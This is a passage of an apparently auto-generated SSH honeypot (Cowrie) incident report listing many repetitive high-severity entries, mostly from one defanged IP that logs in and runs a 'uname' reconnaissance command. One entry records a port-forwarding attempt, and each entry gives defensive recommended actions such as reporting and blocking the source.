| **First Seen** | 2026-08-11 08:49 |
| **Last Seen** | 2026-08-11 08:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:49:27` | `cowrie.session.connect` |
| `2026-08-11 08:49:27` | `cowrie.client.version` |
| `2026-08-11 08:49:27` | `cowrie.client.kex` |
| `2026-08-11 08:49:28` | `cowrie.login.success` |
| `2026-08-11 08:49:29` | `cowrie.session.params` |
| `2026-08-11 08:49:29` | `cowrie.command.input` |
| `2026-08-11 08:49:29` | `cowrie.log.closed` |
| `2026-08-11 08:49:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-392a23d91df9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:49 |
| **Last Seen** | 2026-08-11 08:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:49:33` | `cowrie.session.connect` |
| `2026-08-11 08:49:33` | `cowrie.client.version` |
| `2026-08-11 08:49:33` | `cowrie.client.kex` |
| `2026-08-11 08:49:33` | `cowrie.login.success` |
| `2026-08-11 08:49:34` | `cowrie.session.params` |
| `2026-08-11 08:49:34` | `cowrie.command.input` |
| `2026-08-11 08:49:34` | `cowrie.log.closed` |
| `2026-08-11 08:49:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-567e8d386ef6

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-11 08:49 |
| **Last Seen** | 2026-08-11 08:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:49:33` | `cowrie.session.connect` |
| `2026-08-11 08:49:33` | `cowrie.client.version` |
| `2026-08-11 08:49:33` | `cowrie.client.kex` |
| `2026-08-11 08:49:33` | `cowrie.login.success` |
| `2026-08-11 08:49:33` | `cowrie.direct-tcpip.request` |
| `2026-08-11 08:49:33` | `cowrie.direct-tcpip.data` |
| `2026-08-11 08:49:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca436562b1cd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:49 |
| **Last Seen** | 2026-08-11 08:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:49:37` | `cowrie.session.connect` |
| `2026-08-11 08:49:37` | `cowrie.client.version` |
| `2026-08-11 08:49:38` | `cowrie.client.kex` |
| `2026-08-11 08:49:38` | `cowrie.login.success` |
| `2026-08-11 08:49:39` | `cowrie.session.params` |
| `2026-08-11 08:49:39` | `cowrie.command.input` |
| `2026-08-11 08:49:39` | `cowrie.log.closed` |
| `2026-08-11 08:49:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-adc70d29f4bc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:49 |
| **Last Seen** | 2026-08-11 08:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:49:42` | `cowrie.session.connect` |
| `2026-08-11 08:49:42` | `cowrie.client.version` |
| `2026-08-11 08:49:43` | `cowrie.client.kex` |
| `2026-08-11 08:49:43` | `cowrie.login.success` |
| `2026-08-11 08:49:44` | `cowrie.session.params` |
| `2026-08-11 08:49:44` | `cowrie.command.input` |
| `2026-08-11 08:49:44` | `cowrie.log.closed` |
| `2026-08-11 08:49:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bc6fd2a759a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:49 |
| **Last Seen** | 2026-08-11 08:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:49:47` | `cowrie.session.connect` |
| `2026-08-11 08:49:47` | `cowrie.client.version` |
| `2026-08-11 08:49:47` | `cowrie.client.kex` |
| `2026-08-11 08:49:48` | `cowrie.login.success` |
| `2026-08-11 08:49:48` | `cowrie.session.params` |
| `2026-08-11 08:49:48` | `cowrie.command.input` |
| `2026-08-11 08:49:48` | `cowrie.log.closed` |
| `2026-08-11 08:49:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f44f17305e68

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:49 |
| **Last Seen** | 2026-08-11 08:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:49:52` | `cowrie.session.connect` |
| `2026-08-11 08:49:52` | `cowrie.client.version` |
| `2026-08-11 08:49:52` | `cowrie.client.kex` |
| `2026-08-11 08:49:53` | `cowrie.login.success` |
| `2026-08-11 08:49:53` | `cowrie.session.params` |
| `2026-08-11 08:49:53` | `cowrie.command.input` |
| `2026-08-11 08:49:54` | `cowrie.log.closed` |
| `2026-08-11 08:49:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-852624b15060

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:49 |
| **Last Seen** | 2026-08-11 08:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:49:57` | `cowrie.session.connect` |
| `2026-08-11 08:49:57` | `cowrie.client.version` |
| `2026-08-11 08:49:57` | `cowrie.client.kex` |
| `2026-08-11 08:49:58` | `cowrie.login.success` |
| `2026-08-11 08:49:59` | `cowrie.session.params` |
| `2026-08-11 08:49:59` | `cowrie.command.input` |
| `2026-08-11 08:49:59` | `cowrie.log.closed` |
| `2026-08-11 08:49:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13816758d571

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:50 |
| **Last Seen** | 2026-08-11 08:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:50:02` | `cowrie.session.connect` |
| `2026-08-11 08:50:02` | `cowrie.client.version` |
| `2026-08-11 08:50:02` | `cowrie.client.kex` |
| `2026-08-11 08:50:03` | `cowrie.login.success` |
| `2026-08-11 08:50:04` | `cowrie.session.params` |
| `2026-08-11 08:50:04` | `cowrie.command.input` |
| `2026-08-11 08:50:04` | `cowrie.log.closed` |
| `2026-08-11 08:50:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7b61b694eb2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:50 |
| **Last Seen** | 2026-08-11 08:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:50:08` | `cowrie.session.connect` |
| `2026-08-11 08:50:08` | `cowrie.client.version` |
| `2026-08-11 08:50:08` | `cowrie.client.kex` |
| `2026-08-11 08:50:09` | `cowrie.login.success` |
| `2026-08-11 08:50:09` | `cowrie.session.params` |
| `2026-08-11 08:50:09` | `cowrie.command.input` |
| `2026-08-11 08:50:10` | `cowrie.log.closed` |
| `2026-08-11 08:50:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83e4625ab750

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:50 |
| **Last Seen** | 2026-08-11 08:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:50:13` | `cowrie.session.connect` |
| `2026-08-11 08:50:13` | `cowrie.client.version` |
| `2026-08-11 08:50:13` | `cowrie.client.kex` |
| `2026-08-11 08:50:14` | `cowrie.login.success` |
| `2026-08-11 08:50:15` | `cowrie.session.params` |
| `2026-08-11 08:50:15` | `cowrie.command.input` |
| `2026-08-11 08:50:15` | `cowrie.log.closed` |
| `2026-08-11 08:50:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ea7714ef6f4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:50 |
| **Last Seen** | 2026-08-11 08:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:50:19` | `cowrie.session.connect` |
| `2026-08-11 08:50:19` | `cowrie.client.version` |
| `2026-08-11 08:50:19` | `cowrie.client.kex` |
| `2026-08-11 08:50:19` | `cowrie.login.success` |
| `2026-08-11 08:50:20` | `cowrie.session.params` |
| `2026-08-11 08:50:20` | `cowrie.command.input` |
| `2026-08-11 08:50:20` | `cowrie.log.closed` |
| `2026-08-11 08:50:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8afe5a842455

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:50 |
| **Last Seen** | 2026-08-11 08:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:50:24` | `cowrie.session.connect` |
| `2026-08-11 08:50:24` | `cowrie.client.version` |
| `2026-08-11 08:50:24` | `cowrie.client.kex` |
| `2026-08-11 08:50:24` | `cowrie.login.success` |
| `2026-08-11 08:50:25` | `cowrie.session.params` |
| `2026-08-11 08:50:25` | `cowrie.command.input` |
| `2026-08-11 08:50:26` | `cowrie.log.closed` |
| `2026-08-11 08:50:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1dfdf45c403

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:50 |
| **Last Seen** | 2026-08-11 08:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:50:29` | `cowrie.session.connect` |
| `2026-08-11 08:50:29` | `cowrie.client.version` |
| `2026-08-11 08:50:29` | `cowrie.client.kex` |
| `2026-08-11 08:50:30` | `cowrie.login.success` |
| `2026-08-11 08:50:30` | `cowrie.session.params` |
| `2026-08-11 08:50:30` | `cowrie.command.input` |
| `2026-08-11 08:50:30` | `cowrie.log.closed` |
| `2026-08-11 08:50:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38f78114416c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:50 |
| **Last Seen** | 2026-08-11 08:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:50:34` | `cowrie.session.connect` |
| `2026-08-11 08:50:34` | `cowrie.client.version` |
| `2026-08-11 08:50:34` | `cowrie.client.kex` |
| `2026-08-11 08:50:35` | `cowrie.login.success` |
| `2026-08-11 08:50:36` | `cowrie.session.params` |
| `2026-08-11 08:50:36` | `cowrie.command.input` |
| `2026-08-11 08:50:36` | `cowrie.log.closed` |
| `2026-08-11 08:50:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66976116a174

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:50 |
| **Last Seen** | 2026-08-11 08:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:50:39` | `cowrie.session.connect` |
| `2026-08-11 08:50:39` | `cowrie.client.version` |
| `2026-08-11 08:50:40` | `cowrie.client.kex` |
| `2026-08-11 08:50:40` | `cowrie.login.success` |
| `2026-08-11 08:50:41` | `cowrie.session.params` |
| `2026-08-11 08:50:41` | `cowrie.command.input` |
| `2026-08-11 08:50:41` | `cowrie.log.closed` |
| `2026-08-11 08:50:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fc8212c55f7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:50 |
| **Last Seen** | 2026-08-11 08:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:50:45` | `cowrie.session.connect` |
| `2026-08-11 08:50:45` | `cowrie.client.version` |
| `2026-08-11 08:50:45` | `cowrie.client.kex` |
| `2026-08-11 08:50:45` | `cowrie.login.success` |
| `2026-08-11 08:50:46` | `cowrie.session.params` |
| `2026-08-11 08:50:46` | `cowrie.command.input` |
| `2026-08-11 08:50:46` | `cowrie.log.closed` |
| `2026-08-11 08:50:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eee64c77e2e6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:50 |
| **Last Seen** | 2026-08-11 08:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:50:50` | `cowrie.session.connect` |
| `2026-08-11 08:50:50` | `cowrie.client.version` |
| `2026-08-11 08:50:50` | `cowrie.client.kex` |
| `2026-08-11 08:50:51` | `cowrie.login.success` |
| `2026-08-11 08:50:52` | `cowrie.session.params` |
| `2026-08-11 08:50:52` | `cowrie.command.input` |
| `2026-08-11 08:50:52` | `cowrie.log.closed` |
| `2026-08-11 08:50:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-192e9d06bc41

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:50 |
| **Last Seen** | 2026-08-11 08:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:50:55` | `cowrie.session.connect` |
| `2026-08-11 08:50:55` | `cowrie.client.version` |
| `2026-08-11 08:50:55` | `cowrie.client.kex` |
| `2026-08-11 08:50:56` | `cowrie.login.success` |
| `2026-08-11 08:50:57` | `cowrie.session.params` |
| `2026-08-11 08:50:57` | `cowrie.command.input` |
| `2026-08-11 08:50:57` | `cowrie.log.closed` |
| `2026-08-11 08:50:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3aff6deb05b4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:51 |
| **Last Seen** | 2026-08-11 08:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:51:01` | `cowrie.session.connect` |
| `2026-08-11 08:51:01` | `cowrie.client.version` |
| `2026-08-11 08:51:01` | `cowrie.client.kex` |
| `2026-08-11 08:51:01` | `cowrie.login.success` |
| `2026-08-11 08:51:02` | `cowrie.session.params` |
| `2026-08-11 08:51:02` | `cowrie.command.input` |
| `2026-08-11 08:51:02` | `cowrie.log.closed` |
| `2026-08-11 08:51:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb6cdb1664ef

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:51 |
| **Last Seen** | 2026-08-11 08:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:51:06` | `cowrie.session.connect` |
| `2026-08-11 08:51:06` | `cowrie.client.version` |
| `2026-08-11 08:51:06` | `cowrie.client.kex` |
| `2026-08-11 08:51:06` | `cowrie.login.success` |
| `2026-08-11 08:51:07` | `cowrie.session.params` |
| `2026-08-11 08:51:07` | `cowrie.command.input` |
| `2026-08-11 08:51:07` | `cowrie.log.closed` |
| `2026-08-11 08:51:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec576200777d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:51 |
| **Last Seen** | 2026-08-11 08:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:51:11` | `cowrie.session.connect` |
| `2026-08-11 08:51:11` | `cowrie.client.version` |
| `2026-08-11 08:51:11` | `cowrie.client.kex` |
| `2026-08-11 08:51:12` | `cowrie.login.success` |
| `2026-08-11 08:51:12` | `cowrie.session.params` |
| `2026-08-11 08:51:12` | `cowrie.command.input` |
| `2026-08-11 08:51:12` | `cowrie.log.closed` |
| `2026-08-11 08:51:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8082193baa61

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:51 |
| **Last Seen** | 2026-08-11 08:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:51:17` | `cowrie.session.connect` |
| `2026-08-11 08:51:17` | `cowrie.client.version` |
| `2026-08-11 08:51:17` | `cowrie.client.kex` |
| `2026-08-11 08:51:17` | `cowrie.login.success` |
| `2026-08-11 08:51:18` | `cowrie.session.params` |
| `2026-08-11 08:51:18` | `cowrie.command.input` |
| `2026-08-11 08:51:18` | `cowrie.log.closed` |
| `2026-08-11 08:51:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40520215a856

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:51 |
| **Last Seen** | 2026-08-11 08:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:51:22` | `cowrie.session.connect` |
| `2026-08-11 08:51:22` | `cowrie.client.version` |
| `2026-08-11 08:51:22` | `cowrie.client.kex` |
| `2026-08-11 08:51:23` | `cowrie.login.success` |
| `2026-08-11 08:51:24` | `cowrie.session.params` |
| `2026-08-11 08:51:24` | `cowrie.command.input` |
| `2026-08-11 08:51:24` | `cowrie.log.closed` |
| `2026-08-11 08:51:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-554cd908adff

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:51 |
| **Last Seen** | 2026-08-11 08:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:51:28` | `cowrie.session.connect` |
| `2026-08-11 08:51:28` | `cowrie.client.version` |
| `2026-08-11 08:51:28` | `cowrie.client.kex` |
| `2026-08-11 08:51:28` | `cowrie.login.success` |
| `2026-08-11 08:51:29` | `cowrie.session.params` |
| `2026-08-11 08:51:29` | `cowrie.command.input` |
| `2026-08-11 08:51:29` | `cowrie.log.closed` |
| `2026-08-11 08:51:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da420c60447a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:51 |
| **Last Seen** | 2026-08-11 08:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:51:33` | `cowrie.session.connect` |
| `2026-08-11 08:51:33` | `cowrie.client.version` |
| `2026-08-11 08:51:33` | `cowrie.client.kex` |
| `2026-08-11 08:51:33` | `cowrie.login.success` |
| `2026-08-11 08:51:34` | `cowrie.session.params` |
| `2026-08-11 08:51:34` | `cowrie.command.input` |
| `2026-08-11 08:51:34` | `cowrie.log.closed` |
